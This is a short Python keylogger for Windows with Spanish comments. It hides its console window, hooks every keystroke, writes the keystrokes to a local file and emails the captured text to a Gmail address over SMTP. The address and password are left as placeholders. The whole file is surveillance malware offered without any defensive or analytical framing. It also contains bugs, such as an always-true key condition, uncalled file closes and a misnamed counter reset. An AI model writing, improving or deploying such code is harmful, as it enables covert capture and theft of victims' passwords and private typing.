#!/usr/bin/env python
# -*- coding: utf-8 -*-

import win32console
import win32gui
import pyxhook
import pythoncom
import time
import smtplib
import os
import sys


win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

f = open("c:\output.txt", "w+")
f.close

# Variable para contar pulsaciones.
count = 0


def send_email(message):
    try:
        # Datos
        fromaddr = '@gmail.com'
        toaddrs  = '@gmail.com'
        username = '@gmail.com'
        password = 'pass'

        # Enviando correo
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(username, password)
        server.sendmail(fromaddr, toaddrs, message)
        server.quit()

    except:
        pass


def OnKeyboardEvent(event):

    global count
    count += 1
    # CTRL + E para salir
    if event.Ascii==5:
        sys.exit(0)
    
    if event.Ascii != 0 or 8:
        f = open('c:\output.txt', 'r+')
        buffer = f.read()
        f.close

        if len(buffer) == 1:
            send_email("Arranco...")
        
        elif count == 1000:

            capturado = buffer[-1000].replace("\n"," ")
            send_email(capturado)
            cont = 0
        # abre output.txt escribe y suma nuevas pulsa
        f = open('c:\output.txt', 'w')
        keylogs = chr(event.Ascii)

        # si se teclea ENTER
        if event.Ascii == 13:
            keylogs = '\n'
        
        # si teclea espacio
        if event.Ascii == 32:
            keylogs=' '
        
        buffer += keylogs
        f.write(buffer)
        f.close

# crea el objeto hook manager
hm = pyxhook.HookManager()
hm.KeyDown = OnKeyboardEvent

# set the hook
hm.HookKeyboard()

# wait forever
pythoncom.PumpMessages()